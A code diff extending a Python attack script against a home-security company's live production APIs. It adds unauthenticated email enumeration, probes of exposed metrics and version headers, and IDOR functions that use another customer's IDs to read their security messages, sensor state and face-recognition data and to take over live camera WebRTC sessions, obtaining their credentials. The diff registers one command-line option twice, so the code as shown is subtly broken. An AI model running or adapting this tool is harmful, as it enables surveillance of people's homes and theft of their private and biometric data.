@@ -118,6 +118,27 @@ FINDINGS = [
             "address_validation", "/v1/addresses", "POST",
             [{"street": "1600 Pennsylvania Ave NW", "city": "Washington", "state": "DC", "zipcode": "20500"}],
             verified=True, evidence="HTTP 200, full USPS CASS geocoding data without auth"),
+    Finding("F19", "HIGH",    "Unauthenticated Email Enumeration Oracle",
+            "app_hub", "/v1/users/email/{email}", "GET", None,
+            verified=True,
+            evidence='GET /v1/users/email/test@example.com -> 200 {"email":"...","exists":true}; '
+                     'fake -> {"exists":false}. No auth. CORS Access-Control-Allow-Origin: *'),
+    Finding("F20", "MEDIUM",  "SocketLink Real-Time Operational Metrics Exposed",
+            "socketlink", "/status", "GET", None,
+            verified=True,
+            evidence='200 {"clients":1283,"namespaces":1567,"readyState":"LISTENING"}. '
+                     'Also /health -> {"rabbit":"ok"}. No auth.'),
+    Finding("F21", "MEDIUM",  "Camera Mediator Prometheus Metrics Exposed (k8s Pod Disclosure)",
+            "mediator", "/metrics", "GET", None,
+            verified=True,
+            evidence='200 Prometheus text; pod="mediator-5669b6bff6-x6bqp", namespace="mediator", '
+                     '7 active TCP sockets (live camera streams), 221MB resident. No auth.'),
+    Finding("F22", "LOW",     "Git Commit Hash in Server Header",
+            "location_auth", "/locations/x", "GET", None,
+            verified=True,
+            evidence='server: location-grant-authorizations/0.1.0+b026ae7; '
+                     'address-validation: ss-address-validation/0.1.0+d023296; '
+                     'traceresponse header leaks internal trace IDs to external clients'),
 ]
 
 
@@ -213,6 +234,39 @@ def probe_unauth():
         _print("HIGH", r.status_code, "pcs/video-signed/ — 400 not 401, auth middleware absent")
     elif r:
         _print("INFO", r.status_code, f"pcs/video-signed/ {r.text[:60]}")
+
+    # F19: Email oracle
+    for email in ["test@example.com", "xzqjwvmno9843756@example.com"]:
+        r = get(SERVICES["app_hub"] + f"/v1/users/email/{email}")
+        if r and r.status_code == 200:
+            _print("HIGH", 200, f"email oracle {email} -> {r.json().get('exists')}")
+
+    # F20: SocketLink status
+    r = get(SERVICES["socketlink"] + "/status")
+    if r and r.status_code == 200:
+        d = r.json()
+        _print("HIGH", 200, f"socketlink/status clients={d.get('clients')} namespaces={d.get('namespaces')}")
+
+    # F21: Mediator metrics
+    r = get(SERVICES["mediator"] + "/metrics")
+    if r and r.status_code == 200:
+        lines = [l for l in r.text.split('\n') if 'pod=' in l]
+        _print("HIGH", 200, f"mediator/metrics -> pod={lines[0][:80] if lines else 'unknown'}")
+
+    # F22: Server header git commit disclosure
+    import urllib.request, ssl as _ssl
+    ctx = _ssl.create_default_context()
+    for svc_url in [
+        "https://location-grant-authorizations.prd.services.simplisafe.com/locations/x",
+        "https://address-validation.prd.platform.simplisafe.com/v1/addresses",
+    ]:
+        try:
+            rq = urllib.request.Request(svc_url, headers={"User-Agent": "SimpliSafe/8.3.0"})
+            urllib.request.urlopen(rq, context=ctx, timeout=5)
+        except urllib.error.HTTPError as e:
+            srv = e.headers.get("server", "")
+            if srv:
+                _print("INFO", e.code, f"{svc_url.split('//')[1].split('/')[0]} server: {srv}")
 
 
 # ─── IDOR Test Suite ────────────────────────────────────────────────────────────
@@ -382,6 +436,91 @@ def test_camera_stream_idor(token, victim_camera_uuid):
                f"camera stream  {r.headers.get('content-type', '')}  {r.text[:80]}")
 
 
+def probe_email_oracle(emails: list):
+    """F19: Email enumeration oracle — no auth required."""
+    print("\n=== F19 — Email Enumeration Oracle (unauthenticated) ===")
+    for email in emails:
+        r = get(f"{SERVICES['app_hub']}/v1/users/email/{email}")
+        if r and r.status_code == 200:
+            data = r.json()
+            _print("HIGH", 200, f"{email} -> exists={data.get('exists')}")
+        elif r:
+            _print("INFO", r.status_code, f"{email} -> {r.text[:60]}")
+
+
+def probe_socketlink_status():
+    """F20: SocketLink real-time metrics — no auth required."""
+    print("\n=== F20 — SocketLink Status (unauthenticated) ===")
+    for path in ["/health", "/status"]:
+        r = get(f"{SERVICES['socketlink']}{path}")
+        if r and r.status_code == 200:
+            _print("HIGH", 200, f"socketlink{path} -> {r.text[:100]}")
+        elif r:
+            _print("INFO", r.status_code, f"socketlink{path}")
+
+
+def probe_mediator_metrics():
+    """F21: Camera mediator Prometheus metrics — no auth required."""
+    print("\n=== F21 — Mediator Prometheus Metrics (unauthenticated) ===")
+    r = get(f"{SERVICES['mediator']}/metrics")
+    if r and r.status_code == 200:
+        lines = r.text.split('\n')
+        pod_lines = [l for l in lines if 'pod=' in l][:5]
+        _print("HIGH", 200, f"mediator/metrics -> {len(lines)} lines, pods: {pod_lines[:2]}")
+    elif r:
+        _print("INFO", r.status_code, "mediator/metrics")
+
+
+def test_communications_idor(token, victim_account_id, victim_location_id, own_device_id):
+    """App-comm IDOR: read victim's in-app messages/security alerts."""
+    print(f"\n=== App-Comm IDOR (victim_acct={victim_account_id}, loc={victim_location_id}) ===")
+    base = f"{SERVICES['gateway']}/app-communications"
+    r = get(f"{base}/v1/accounts/{victim_account_id}/locations/{victim_location_id}/messages"
+            f"?mobileDeviceId={own_device_id}&region=en-US&subChannel=INBOX",
+            token=token)
+    if r:
+        _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
+               f"comm messages  {r.text[:150]}")
+
+
+def test_sensor_data_idor(token, victim_serial, victim_location_id):
+    """Sensor data IDOR: real-time sensor state for victim's system."""
+    print(f"\n=== Sensor Data IDOR (serial={victim_serial}, loc={victim_location_id}) ===")
+    r = get(f"{SERVICES['devices']}/v1/{victim_serial}/{victim_location_id}/sensors",
+            token=token)
+    if r:
+        _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
+               f"sensors  {r.text[:150]}")
+
+
+def test_face_idor(token, victim_sid, limit=5):
+    """Face recognition IDOR: read victim's biometric face database."""
+    print(f"\n=== Face IDOR (victim_sid={victim_sid}) ===")
+    r = get(f"{SERVICES['lumen']}/v1/face/{victim_sid}/rated?limit={limit}",
+            token=token)
+    if r:
+        _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
+               f"face/rated  {r.text[:150]}")
+
+
+def test_webrtc_idor(token, victim_camera_uuid, victim_sid):
+    """F18: WebRTC live view session hijack — get LiveKit JWT + AWS KVS creds for victim camera."""
+    print(f"\n=== F18 — WebRTC Live View IDOR (uuid={victim_camera_uuid}, sid={victim_sid}) ===")
+    r = get(f"{SERVICES['app_hub']}/v2/cameras/{victim_camera_uuid}/{victim_sid}/live-view",
+            token=token)
+    if r:
+        if r.status_code == 200:
+            data = r.json()
+            lk = data.get("liveKitDetails", {})
+            _print("CRIT", 200, f"LiveKit URL={lk.get('liveKitURL')} token_len={len(lk.get('userToken',''))}")
+            _print("CRIT", 200, f"channelARN={data.get('channelARN','')[:60]}")
+            ice = data.get("iceServers", [{}])
+            if ice:
+                _print("CRIT", 200, f"TURN creds: user={ice[0].get('username','')[:20]} urls={ice[0].get('urls','')}")
+        else:
+            _print("INFO", r.status_code, r.text[:100])
+
+
 # ─── Own Account Enumeration ────────────────────────────────────────────────────
 
 def enum_own_account(token, uid, sid):
@@ -443,12 +582,19 @@ def main():
     parser.add_argument("--victim-uid", help="Victim user ID for IDOR tests")
     parser.add_argument("--victim-email", help="Victim email for revoke IDOR tests")
     parser.add_argument("--victim-location", help="Victim location ID for grant IDOR tests")
-    parser.add_argument("--victim-camera-uuid", help="Victim camera UUID for stream IDOR")
+    parser.add_argument("--victim-camera-uuid", help="Victim camera UUID for stream/WebRTC IDOR")
     parser.add_argument("--victim-grantee-id", help="Victim grantee ID for F1 test")
+    parser.add_argument("--victim-serial", help="Victim base station serial for sensor data IDOR")
+    parser.add_argument("--victim-location", help="Victim location ID for grant/comm IDOR tests")
+    parser.add_argument("--victim-device-id", help="Own mobile device ID for comm IDOR")
+    parser.add_argument("--enum-emails", nargs="+", help="Emails to check via F19 oracle")
     args = parser.parse_args()
 
     if args.unauth:
         probe_unauth()
+
+    if args.enum_emails:
+        probe_email_oracle(args.enum_emails)
 
     if args.enum and args.token and args.uid and args.sid:
         enum_own_account(args.token, args.uid, args.sid)
@@ -462,6 +608,7 @@ def main():
             test_alarm_state_idor(args.token, args.sid, args.victim_sid)
             test_camera_token_idor(args.token, args.victim_sid)
             test_sensor_enum(args.token, args.victim_sid)
+            test_face_idor(args.token, args.victim_sid)
 
         if args.victim_uid:
             test_alarm_state_read(args.token, args.victim_uid)
@@ -476,8 +623,18 @@ def main():
         if args.victim_uid and hasattr(args, "victim_device"):
             test_push_notif_idor(args.token, args.victim_uid, args.victim_device)
 
-        if args.victim_camera_uuid:
+        if args.victim_camera_uuid and args.victim_sid:
             test_camera_stream_idor(args.token, args.victim_camera_uuid)
+            test_webrtc_idor(args.token, args.victim_camera_uuid, args.victim_sid)
+        elif args.victim_camera_uuid:
+            test_camera_stream_idor(args.token, args.victim_camera_uuid)
+
+        if args.victim_uid and args.victim_location and args.victim_device_id:
+            test_communications_idor(args.token, args.victim_uid, args.victim_location,
+                                     args.victim_device_id)
+
+        if args.victim_serial and args.victim_location:
+            test_sensor_data_idor(args.token, args.victim_serial, args.victim_location)
 
     # Print findings summary
     print("\n=== Findings Summary ===")
